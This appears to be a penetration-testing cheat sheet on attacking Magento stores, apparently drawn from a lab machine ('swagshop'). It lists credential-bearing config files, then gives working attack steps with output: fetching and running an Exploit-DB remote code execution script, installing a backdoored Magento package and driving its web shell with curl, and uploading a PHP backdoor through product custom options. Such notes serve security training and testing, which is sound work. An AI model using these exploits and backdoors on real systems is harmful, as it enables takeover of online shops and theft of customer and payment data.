# Majento Enumeration

## Checks
- Look for Majento version
- Easy access to the admin panel (Credentials reuse)

## Tool to enumerate (magescan)
```bash
# Clone the github repository
git clone https://github.com/steverobbins/magescan.git
```
#### How to use it
```bash
php magescan.phar scan:all www.example.com
```

## Interesting files
- /app/etc/local.xml
- /index.php/rss/order/NEW/new
- /app/etc/config.xml

## Getting code execution
### Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution 
```bash
# Downlaod the exploit
wget https://www.exploit-db.com/raw/37811

# Execute it on the admin login page
python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"
Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

### Upload malicious Magento package
1. Download a malicious Magento package
```bash
git clone https://github.com/lavalamp-/LavaMagentoBD.git
```
2. Upload the malicious package
	- http://10.10.10.140/downloader/
3. Execute the shell by accessing the URL
```bash
curl -d 'c=id' http://10.10.10.140/index.php/lavalamp/index
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Command Execution in Product Creation
1. Login with a user that has a privilege to create products.
2. Create a new product or edit an existing product to add Custom Options.
3. Upload your .phtml (allowed extension for “Magento”).
4. Access your file providing a full path to the file.

#### Exploitation
- Catalog -> Manage Products
- Click "Edit" on one of the products
- Clicks "Custom Options"
- Click "Add New Option"
- Update the "Title" and "Input Type"
	- In "Allowed File Extension" put ".phtml" (A standard PHP backdoor will be enough)
- Click on the updated products directly from the home page
- Click on "Browse" to upload the malicious ".phtml" file
- Click "Add to card"
- Access the file here :
	- /media/custom_options/quote/firstLetterOfYourFileName/secondLetterOfYourFileName/md5(contentOfYourPhtmlFile).phtml